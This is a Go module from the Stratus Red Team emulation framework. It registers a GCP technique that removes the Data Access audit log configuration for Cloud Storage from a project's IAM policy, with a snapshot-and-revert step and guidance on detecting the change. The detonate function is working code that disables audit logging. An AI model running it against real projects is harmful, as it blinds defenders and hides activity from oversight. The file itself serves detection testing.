package gcp

import (
	"context"
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	cloudresourcemanager "google.golang.org/api/cloudresourcemanager/v3"
)

//go:embed main.tf
var tf []byte

const targetService = "storage.googleapis.com"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.defense-evasion.disable-audit-logs",
		FriendlyName: "Disable Data Access Audit Logs for a GCP Service",
		Description: `
Removes the Data Access audit log configuration for Cloud Storage from the project
IAM policy. Data Access audit logs record data access operations such as reads and
writes to GCS objects. Disabling them reduces an attacker's visibility footprint in
Cloud Logging.

Warm-up:

- Snapshot the current project IAM policy (including any pre-existing audit config
  for <code>storage.googleapis.com</code>) so it can be restored on revert

Detonation:

- Set a DATA_READ and DATA_WRITE <code>auditConfig</code> entry for
  <code>storage.googleapis.com</code> (overwriting any existing config)
- Remove the <code>auditConfig</code> entry for <code>storage.googleapis.com</code> from the
  project IAM policy via the Cloud Resource Manager API

Revert:

- Restore the exact <code>auditConfig</code> that existed before detonation (including
  any custom log types or exempted members), or leave the config absent if it was
  not present before

References:

- https://cloud.google.com/logging/docs/audit/configure-data-access
- https://cloud.google.com/resource-manager/reference/rest/v3/projects/setIamPolicy
- https://attack.mitre.org/techniques/T1562/008/
- https://redcanary.com/threat-detection-report/trends/cloud-attacks/
- https://www.sysdig.com/blog/suspicious-activity-gcp-audit-logs
`,
		Detection: `
Identify when Data Access audit log configuration is removed from the project IAM policy
by monitoring for <code>SetIamPolicy</code> events in GCP Admin Activity audit logs where
the request removes or reduces <code>auditConfigs</code> entries.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.DefenseEvasion},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

// originalPolicy is the JSON structure we parse from the Terraform output.
// We only care about the auditConfigs field.
type originalPolicy struct {
	AuditConfigs []originalAuditConfig `json:"auditConfigs"`
}

type originalAuditConfig struct {
	Service         string                   `json:"service"`
	AuditLogConfigs []originalAuditLogConfig `json:"auditLogConfigs"`
}

type originalAuditLogConfig struct {
	LogType         string   `json:"logType"`
	ExemptedMembers []string `json:"exemptedMembers,omitempty"`
}

func getIamPolicy(svc *cloudresourcemanager.Service, resource string) (*cloudresourcemanager.Policy, error) {
	policy, err := svc.Projects.GetIamPolicy(resource, &cloudresourcemanager.GetIamPolicyRequest{
		Options: &cloudresourcemanager.GetPolicyOptions{RequestedPolicyVersion: 3},
	}).Do()
	if err != nil {
		return nil, fmt.Errorf("failed to get project IAM policy: %w", err)
	}
	return policy, nil
}

// setAuditConfigs replaces the auditConfigs field of the project IAM policy.
// It uses updateMask="auditConfigs" so that only the audit config is modified
// and IAM bindings are left untouched — this avoids validation failures from
// stale bindings referencing deleted custom roles.
func setAuditConfigs(svc *cloudresourcemanager.Service, resource string, policy *cloudresourcemanager.Policy, configs []*cloudresourcemanager.AuditConfig) error {
	_, err := svc.Projects.SetIamPolicy(resource, &cloudresourcemanager.SetIamPolicyRequest{
		Policy: &cloudresourcemanager.Policy{
			Etag:         policy.Etag,
			Version:      3,
			AuditConfigs: configs,
		},
		UpdateMask: "auditConfigs",
	}).Do()
	return err
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	resource := "projects/" + providers.GCP().GetProjectId()

	svc, err := cloudresourcemanager.NewService(context.Background(), providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create Cloud Resource Manager client: %w", err)
	}

	// Ensure a DATA_READ+DATA_WRITE config exists for the target service,
	// overwriting any pre-existing config. This guarantees we always have
	// something to remove regardless of the project's current state.
	policy, err := getIamPolicy(svc, resource)
	if err != nil {
		return err
	}

	withConfig := make([]*cloudresourcemanager.AuditConfig, 0, len(policy.AuditConfigs)+1)
	for _, ac := range policy.AuditConfigs {
		if ac.Service != targetService {
			withConfig = append(withConfig, ac)
		}
	}
	withConfig = append(withConfig, &cloudresourcemanager.AuditConfig{
		Service: targetService,
		AuditLogConfigs: []*cloudresourcemanager.AuditLogConfig{
			{LogType: "DATA_READ"},
			{LogType: "DATA_WRITE"},
		},
	})

	log.Printf("Setting DATA_READ+DATA_WRITE audit config for %s\n", targetService)
	if err = setAuditConfigs(svc, resource, policy, withConfig); err != nil {
		return fmt.Errorf("failed to set audit config for %s: %w", targetService, err)
	}

	// Re-read to get a fresh etag, then remove the config.
	policy, err = getIamPolicy(svc, resource)
	if err != nil {
		return err
	}

	filtered := make([]*cloudresourcemanager.AuditConfig, 0, len(policy.AuditConfigs))
	for _, ac := range policy.AuditConfigs {
		if ac.Service != targetService {
			filtered = append(filtered, ac)
		}
	}

	log.Printf("Removing Data Access audit log configuration for %s\n", targetService)
	if err = setAuditConfigs(svc, resource, policy, filtered); err != nil {
		return fmt.Errorf("failed to remove audit config for %s: %w", targetService, err)
	}

	log.Printf("Successfully removed audit log configuration for %s\n", targetService)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	resource := "projects/" + providers.GCP().GetProjectId()

	policyJSON, err := base64.StdEncoding.DecodeString(params["original_policy_b64"])
	if err != nil {
		return fmt.Errorf("failed to decode original policy snapshot: %w", err)
	}

	var original originalPolicy
	if err := json.Unmarshal(policyJSON, &original); err != nil {
		return fmt.Errorf("failed to parse original policy snapshot: %w", err)
	}

	// Build the original audit config for the target service (if any).
	var originalConfig *cloudresourcemanager.AuditConfig
	for _, ac := range original.AuditConfigs {
		if ac.Service != targetService {
			continue
		}
		logConfigs := make([]*cloudresourcemanager.AuditLogConfig, len(ac.AuditLogConfigs))
		for i, lc := range ac.AuditLogConfigs {
			logConfigs[i] = &cloudresourcemanager.AuditLogConfig{
				LogType:         lc.LogType,
				ExemptedMembers: lc.ExemptedMembers,
			}
		}
		originalConfig = &cloudresourcemanager.AuditConfig{
			Service:         ac.Service,
			AuditLogConfigs: logConfigs,
		}
		break
	}

	svc, err := cloudresourcemanager.NewService(context.Background(), providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create Cloud Resource Manager client: %w", err)
	}

	policy, err := getIamPolicy(svc, resource)
	if err != nil {
		return err
	}

	// Replace whatever is currently there with the original config.
	restored := make([]*cloudresourcemanager.AuditConfig, 0, len(policy.AuditConfigs)+1)
	for _, ac := range policy.AuditConfigs {
		if ac.Service != targetService {
			restored = append(restored, ac)
		}
	}
	if originalConfig != nil {
		log.Printf("Restoring original audit log configuration for %s\n", targetService)
		restored = append(restored, originalConfig)
	} else {
		log.Printf("No original audit config for %s — ensuring it stays removed\n", targetService)
	}

	if err = setAuditConfigs(svc, resource, policy, restored); err != nil {
		return fmt.Errorf("failed to restore audit config for %s: %w", targetService, err)
	}

	log.Printf("Successfully restored audit log configuration for %s\n", targetService)
	return nil
}
